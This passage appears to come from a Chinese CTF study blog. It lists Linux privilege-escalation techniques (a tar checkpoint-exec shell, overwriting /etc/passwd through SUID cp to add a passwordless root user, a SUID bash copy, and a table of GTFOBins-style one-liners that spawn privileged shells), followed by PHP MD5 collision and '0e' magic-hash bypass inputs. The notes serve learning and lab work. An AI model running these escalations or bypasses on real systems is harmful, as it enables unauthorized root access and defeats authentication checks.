class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec=&quot;/bin/bash&quot;<br></code></pre></td></tr></table></figure><ul><li><code>-c</code>：创建新的档案文件，相当于打包（-x，相反的操作，拆包）</li><li><code>-f</code>：使用档名，f之后直接加档名，中间不能加其他参数</li><li><code>--checkpoint=n</code>：每写入n个记录之后设置一个检查点，在检查点可以执行任意的操作，操作由 –checkpoint-action 指定</li><li><code>exec</code>：执行外部命令</li></ul><p>执行这个命令后就提权成功了，用<code>id</code>命令查看当前用户发现已经是root，此时可以自由查看 &#x2F;root 文件中的内容</p><h3 id="suid-cp提权"><a href="#suid-cp提权" class="headerlink" title="suid cp提权"></a><strong>suid cp提权</strong></h3><p>用命令查找是否存在suid提权的可能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>看到<code>/bin/cp</code>就知道可以用 cp 提权了<br>操作步骤：先构造一个和&#x2F;etc&#x2F;passwd里一样的文件 然后在文件的末尾加上一个用户 这个用户的相关信息都可以随你编写 再利用cp的高权限对&#x2F;etc&#x2F;passwd文件进行覆盖 </p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a><strong>方法一</strong></h4><p>在&#x2F;tmp新建一个passwd文件，在tmp的原因是因为tmp目录是临时缓存目录 一般访问和修改权限较低但可执行权限较高</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo &quot;hacker::0:0:hacker:/home/hacker:/bin/bash&quot; &gt;&gt;/tmp/passwd<br></code></pre></td></tr></table></figure><p>然后回到命令行使用 cp 命令把 &#x2F;etc&#x2F;passwd 用 &#x2F;tmp&#x2F;passwd 替换掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cp /tmp/passwd /etc/passwd<br></code></pre></td></tr></table></figure><p>然后<code>cat /etc/passwd</code>查看 &#x2F;etc&#x2F;passwd 可以看到有了hacker用户</p><p>使用<code>su hacker</code>命令切换成hacker用户</p><p>此时我们拥有root权限，就可以查看root文件里的内容了</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">cp /bin/bash /tmp<br>/bin/cp --attributes-only --preserve=all /bin/cp /tmp/bash<br>/tmp/bash -p<br></code></pre></td></tr></table></figure><p>依次执行完这三个命令</p><p>用<code>id</code>命令可以看到euid已经是root了，用<code>whoami</code>可以看到是root</p><p>此时就可以查看root文件里的内容</p><h3 id="suid-gdb提权"><a href="#suid-gdb提权" class="headerlink" title="suid gdb提权"></a>suid gdb提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit<br></code></pre></td></tr></table></figure><h3 id="常用提权命令"><a href="#常用提权命令" class="headerlink" title="常用提权命令"></a>常用提权命令</h3><table><thead><tr><th><strong><font style="color:rgb(0, 161, 251);">命令</font></strong></th><th><strong><font style="color:rgb(0, 161, 251);">利用方法</font></strong></th></tr></thead><tbody><tr><td>zsh</td><td>zsh</td></tr><tr><td><strong>xargs</strong></td><td>xargs -a &#x2F;dev&#x2F;null sh -p</td></tr><tr><td><strong>watch</strong></td><td>watch -x sh -c ‘reset; exec sh -p 1&gt;&amp;0 2&gt;&amp;0’</td></tr><tr><td><strong>timeout</strong></td><td>timeout 7d &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>time</strong></td><td>time &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>tclsh</strong></td><td>+ tclsh <br/>+ exec &#x2F;bin&#x2F;sh -p &lt;@stdin &gt;@stdout 2&gt;@stderr</td></tr><tr><td><strong>taskset</strong></td><td>taskset 1 &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>stdbuf</strong></td><td>stdbuf -i0 &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>strace</strong></td><td>strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>ssh</strong></td><td>ssh -o ProxyCommand&#x3D;’;sh -p 0&lt;&amp;2 1&gt;&amp;2’ x</td></tr><tr><td><strong>setarch</strong></td><td>setarch $(arch) &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>rsync</strong></td><td>rsync -e ‘sh -p -c “sh -p 0&lt;&amp;2 1&gt;&amp;2”’ 127.0.0.1:&#x2F;dev&#x2F;null</td></tr><tr><td><strong>rpm</strong></td><td>rpm –eval ‘%{lua:os.execute(“&#x2F;bin&#x2F;sh -p”)}’</td></tr><tr><td><strong>python</strong></td><td>python -c ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td></tr><tr><td><strong>php</strong></td><td>+  CMD&#x3D;”&#x2F;bin&#x2F;sh”  <br/>+  php -r “pcntl_exec(’&#x2F;bin&#x2F;sh’, [’-p’]);”</td></tr><tr><td><strong>nice</strong></td><td>nice &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>nano</strong></td><td>+  nano &#x2F;&#x2F;运行nano程序  <br/>+  ^R &#x2F;&#x2F;按下ctrl-r  <br/>+  ^X &#x2F;&#x2F;按下ctrl-x 4、reset; sh -p 1&gt;&amp;0 2&gt;&amp;0 &#x2F;&#x2F;输入下面的命令</td></tr><tr><td><strong>more</strong></td><td>+  more &#x2F;etc&#x2F;profile<br/>+  !&#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>logsave</strong></td><td>logsave &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -i -p</td></tr><tr><td><strong>less</strong></td><td>less &#x2F;etc&#x2F;profile &#x2F;&#x2F;读取文件，在底行输入!&#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>ksh</strong></td><td>ksh -p</td></tr><tr><td><strong>ip</strong></td><td>+  ip netns add foo  <br/>+  ip netns exec foo &#x2F;bin&#x2F;sh -p  <br/>+  ip netns delete foo</td></tr><tr><td><strong>ionice</strong></td><td>ionice &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>git</strong></td><td>git help status</td></tr><tr><td><strong>gimp</strong></td><td>gimp -idf –batch-interpreter&#x3D;python-fu-eval -b ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td></tr><tr><td><strong>gdb</strong></td><td>gdb -nx -ex ‘python import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’ -ex quit</td></tr><tr><td><strong>ftp</strong></td><td>ftp &#x2F;&#x2F;在底行输入“!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td><strong>flock</strong></td><td>flock -u &#x2F; &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>find</strong></td><td>find . -exec &#x2F;bin&#x2F;sh -p ; -quit</td></tr><tr><td><strong>expect</strong></td><td>expect -c ‘spawn &#x2F;bin&#x2F;sh -p;interact’</td></tr><tr><td><strong>env</strong></td><td>env &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>ed</strong></td><td>ed &#x2F;&#x2F;在底行输入“!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td><strong>docker</strong></td><td>docker run -v &#x2F;:&#x2F;mnt –rm -it alpine chroot &#x2F;mnt sh</td></tr><tr><td><strong>dmesg</strong></td><td>dmesg -H&#x2F;&#x2F;在底行输入“!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td><strong>csh</strong></td><td>csh -b</td></tr><tr><td><strong>bash</strong></td><td>bash -p</td></tr><tr><td><strong>awk</strong></td><td>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash -p”)}’</td></tr><tr><td><strong>perl</strong></td><td>perl exec “&#x2F;bin&#x2F;bash”;</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MD5绕过</title>
    <link href="/2025/04/25/MD5%E7%BB%95%E8%BF%87/"/>
    <url>/2025/04/25/MD5%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">对于：(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_1&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_1&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_2&#x27;</span>])<br>● md5_1=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%<span class="hljs-number">5</span>f%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%f3%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%e9%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">13</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%a8%<span class="hljs-number">1</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%<span class="hljs-number">39</span>%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>● md5_2=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br></code></pre></td></tr></table></figure><h3 id="MD5值相等的字符串"><a href="#MD5值相等的字符串" class="headerlink" title="MD5值相等的字符串"></a>MD5值相等的字符串</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">●  %<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">00</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2 <br>●  %<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">02</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%d5%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2  <br></code></pre></td></tr></table></figure><h3 id="MD5值为0e开头的字符"><a href="#MD5值为0e开头的字符" class="headerlink" title="MD5值为0e开头的字符"></a>MD5值为0e开头的字符</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br><span class="hljs-number">240610708</span>：<span class="hljs-number">0</span>e4620974319065090195<span class="hljs-number">62988736854</span><br>QLTHNDT：<span class="hljs-number">0</span>e40596782540195537<span class="hljs-number">2549139051580</span><br>QNKCDZO：<span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br>PJNPDWY：<span class="hljs-number">0</span>e2915290528947027745<span class="hljs-number">57631701704</span><br>NWWKITQ：<span 